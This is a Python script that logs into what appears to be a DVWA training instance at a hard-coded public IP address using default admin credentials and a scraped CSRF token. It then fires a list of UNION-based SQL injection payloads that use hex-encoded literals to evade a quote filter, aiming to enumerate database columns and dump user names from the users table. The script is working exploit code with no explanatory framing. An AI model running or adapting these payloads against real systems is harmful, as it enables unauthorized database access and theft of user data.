
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] Trying to bypass quote filter with UNION query...\n")

# Let's try to dump all tables directly
payloads = [
    # Try with HEX encoding for table name
    "-1' UNION SELECT GROUP_CONCAT(COLUMN_NAME), 'x' FROM information_schema.COLUMNS WHERE TABLE_NAME=0x7573657273",
    # Try with no quotes on string literal
    "-1' UNION SELECT GROUP_CONCAT(COLUMN_NAME),TABLE_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=0x64767761 LIMIT 10",
    # Simple UNION that doesn't use information_schema
    "-1' UNION SELECT 1,2 -- ",
    # Try simple column enumeration
    "-1' UNION SELECT 1,user_id FROM users LIMIT 1",
    "-1' UNION SELECT user_id,first_name FROM users",
    "-1' UNION SELECT first_name,last_name FROM users",
]

for payload_str in payloads:
    print(f"[*] Trying: {payload_str}")
    response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
    
    # Extract the pre section
    pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if pre_match:
        result_text = pre_match.group(1)
        if "Unknown column" not in result_text and "syntax" not in result_text.lower():
            print(f"    [+] Result:\n{result_text[:300]}\n")
        else:
            print(f"    [-] Error: {result_text[:100]}\n")

